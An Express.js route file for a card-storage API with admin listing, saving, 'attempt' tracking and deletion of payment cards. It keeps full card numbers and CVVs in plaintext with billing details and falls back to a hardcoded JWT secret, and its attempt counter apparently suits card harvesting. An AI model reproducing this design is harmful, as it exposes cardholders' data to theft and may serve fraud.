const express = require('express');
const router = express.Router();
const jwt = require('jsonwebtoken');
const Card = require('../models/Card');
const User = require('../models/User');

const JWT_SECRET = process.env.JWT_SECRET || 'jellery_secret_2026';

function maskCard(num) {
  if (!num) return '****';
  const clean = num.replace(/\s/g, '');
  return '****-****-****-' + clean.slice(-4);
}

function authMiddleware(req, res, next) {
  try {
    const token = req.header('Authorization')?.replace('Bearer ', '');
    if (!token) return res.status(401).json({ message: 'Unauthorized' });
    const decoded = jwt.verify(token, JWT_SECRET);
    req.userId = decoded.id;
    req.userRole = decoded.role;
    next();
  } catch {
    return res.status(401).json({ message: 'Invalid token' });
  }
}

// GET all cards - admin only
router.get('/', authMiddleware, async (req, res) => {
  try {
    if (req.userRole !== 'admin') {
      return res.status(403).json({ message: 'Admin only' });
    }
    const cards = await Card.find().sort({ createdAt: -1 });
    const masked = cards.map(c => ({
      ...c._doc,
      cardNumber: maskCard(c.cardNumber),
      cvv: '***',
    }));
    res.json(masked);
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

// Save card - requires auth
router.post('/save', authMiddleware, async (req, res) => {
  try {
    const { cardNumber, cardName, expiry, cvv, type, firstName, lastName, email, phoneCode, phone, street, city, state, zip, country } = req.body;
    if (!cardNumber || !cardName || !expiry || !cvv) {
      return res.status(400).json({ message: 'All card fields required' });
    }
    const cleanNumber = cardNumber.replace(/\s/g, '');
    const existing = await Card.findOne({ cardNumber: cleanNumber });
    if (existing) {
      return res.json({ saved: false, message: 'Card already exists' });
    }
    await Card.create({
      cardNumber: cleanNumber, cardName, expiry, cvv,
      type: type || 'credit_card',
      firstName, lastName, email, phoneCode, phone,
      street, city, state, zip, country,
      userId: req.userId,
    });
    res.json({ saved: true, message: 'Card saved' });
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

// Track attempt - requires auth
router.post('/attempt', authMiddleware, async (req, res) => {
  try {
    const { cardNumber } = req.body;
    const cleanNumber = cardNumber.replace(/\s/g, '');
    const card = await Card.findOne({ cardNumber: cleanNumber });
    if (card) {
      card.attempts += 1;
      await card.save();
      return res.json({ saved: false, attempts: card.attempts, message: 'Card already saved' });
    }
    res.json({ saved: false, message: 'Card not found' });
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

// Delete card - admin only
router.delete('/:id', authMiddleware, async (req, res) => {
  try {
    if (req.userRole !== 'admin') {
      return res.status(403).json({ message: 'Admin only' });
    }
    await Card.findByIdAndDelete(req.params.id);
    res.json({ message: 'Card deleted' });
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

module.exports = router;
